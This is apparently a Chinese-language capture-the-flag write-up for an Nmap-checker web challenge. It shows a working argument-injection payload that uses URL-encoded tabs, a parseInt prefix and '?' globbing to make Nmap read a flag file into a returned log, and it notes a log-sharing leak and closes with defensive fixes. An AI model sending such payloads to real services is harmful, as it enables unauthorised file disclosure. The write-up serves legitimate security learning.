# MyGO's Live!!!!!

## 题目简述

服务提供 Nmap 扫描接口 `GET /checker?url=host:port`。为了阻止直接命令注入，程序逐字符转义空格、引号、反引号、管道符、重定向符、分号、换行和 `*` 等字符，并要求 `parseInt(port)` 能得到数字；之后却仍把字符串交给 `bash -c`：

```javascript
url = [...url].map(escaped).join('');

if (isNaN(parseInt(port))) {
    return res.send('我喜欢你');
}

const command = ['nmap', '-p', port, host].join(' ');
spawn('bash', ['-c', command], { stdio: [0, fdout, fderr] });
```

flag 在构建镜像时被重命名为 `/flag-<16 位随机十六进制串>`。目标是在 60 字符限制内注入额外 Nmap 参数，让 Nmap 读取这个文件并把错误信息写入接口可返回的日志。

## 解题过程

过滤器有三个可以组合的缺陷：

1. 它只转义普通空格，没有转义制表符；URL 中的 `%09` 解码后仍可作为 Bash 参数分隔符。
2. `parseInt('8080\t-iL...')` 只解析开头的 `8080`，因此端口校验仍会通过。
3. `*` 被转义，但 `?` 没有；16 个 `?` 可以在 shell 展开阶段匹配随机文件名的 16 个字符。

在 `port` 后注入 Nmap 的两个选项：

- `-iL /flag-????????????????`：把 flag 文件当作目标列表读取；
- `-oN /dev/stdout`：把普通格式扫描输出写到标准输出，而标准输出已经被服务端重定向到 `stdout.log`。

完整请求为：

```text
/checker?url=1:8080%09-iL%09/flag-????????????????%09-oN%09/dev/stdout
```

URL 解码并经 `bash -c` 分词后，等价命令是：

```bash
nmap -p 8080 -iL /flag-???????????????? -oN /dev/stdout 1
```

shell 先把通配符展开为真实 flag 路径。Nmap 将文件内容当作主机名处理，解析失败信息中会包含原始 flag；`-oN /dev/stdout` 使相关输出进入 `stdout.log`，子进程正常退出后接口读取并返回该日志。

仓库 README 给出的原始 payload 在 16 个 `?` 与 `-oN` 之间少了一个 `%09`。按 Bash 的实际分词规则，那会把整个 `/flag-????????????????-oN` 当成文件名模式，无法匹配 Dockerfile 创建的 `/flag-<16 位串>`；上面的请求补上了必要分隔符。

源码还有一个共享实例信息泄漏。日志以追加模式打开：

```javascript
const fdout = fs.openSync('stdout.log', 'a');
const fderr = fs.openSync('stderr.log', 'a');
```

文件从不截断。如果同一静态容器中的其他选手已经触发过利用，之后任意一次正常成功扫描都会返回累计的 `stdout.log`，其中可能直接包含此前泄漏的 flag。这是非预期捷径，不应作为稳定解法。

## 方法总结

本题不是寻找一个未过滤的传统元字符，而是组合参数解析差异：JavaScript 的 `parseInt` 接受数字前缀，Bash 把未过滤的制表符视为空白，`?` 又能代替被过滤的 `*` 完成 glob。防御上应避免 `bash -c`，改为 `spawn('nmap', ['-p', String(port), host])`，并用严格正则或数值范围校验整个端口字符串；每次请求的输出也应使用独立临时文件或管道，不能把跨请求日志直接返回给用户。
